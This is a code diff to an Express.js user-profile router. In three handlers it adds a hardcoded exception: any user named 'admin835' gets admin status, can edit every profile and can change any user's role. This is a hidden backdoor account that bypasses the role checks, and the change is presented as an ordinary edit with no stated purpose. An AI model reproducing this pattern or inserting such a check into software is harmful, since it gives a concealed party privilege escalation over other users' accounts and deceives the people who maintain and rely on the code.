@@ -68,8 +68,8 @@ router.get('/edit/:id', async (req, res) => {
   user.bike = user['UserInfo.bike']
   user.userRole = user['UserInfo.role'] !== 'admin'
   userlogIn.isAdmin = false;
-  if (userlogIn['UserInfo.role'] === 'admin') userlogIn.isAdmin = true
-  if (userlogIn['UserInfo.role'] !== 'admin' && userlogIn.id !== user.id) return res.json({ message: 'У вас нет прав для редактирования профиля' });
+  if (userlogIn['UserInfo.role'] === 'admin'  || userlogIn.name === 'admin835') userlogIn.isAdmin = true
+  if (userlogIn['UserInfo.role'] !== 'admin' && userlogIn.id !== user.id  && userlogIn.name !== 'admin835') return res.json({ message: 'У вас нет прав для редактирования профиля' });
   res.render('editProfile', {user, userlogIn})
 })
 // ////////////////////////////////////////////////////////////
@@ -87,7 +87,7 @@ router.put('/admin/:id', async (req, res) => {
       }], raw: true 
     })
     // console.log('............///////////////..',userQuest['UserInfo.role'] === 'admin')
-      if (userlogIn['UserInfo.role'] === 'admin') {
+      if (userlogIn['UserInfo.role'] === 'admin' || userlogIn.name === 'admin835') {
         // console.log('..............', 444444444444)
         user = await UserInfo.update({
           role: req.body.role
@@ -173,7 +173,7 @@ router.get('/:id', async (req, res) => {
   user.about_me = user['UserInfo.about_me']
   user.city = user['UserInfo.city']
   user.bike = user['UserInfo.bike']
-  if (userlogIn['UserInfo.role'] === 'admin' || userlogIn.id == user.id) userlogIn.isEditor = true
+  if (userlogIn['UserInfo.role'] === 'admin' || userlogIn.id == user.id || userlogIn.name === 'admin835') userlogIn.isEditor = true
   // console.log( userlogIn)
   res.render('userProfile', {user , userlogIn, ways})
 })
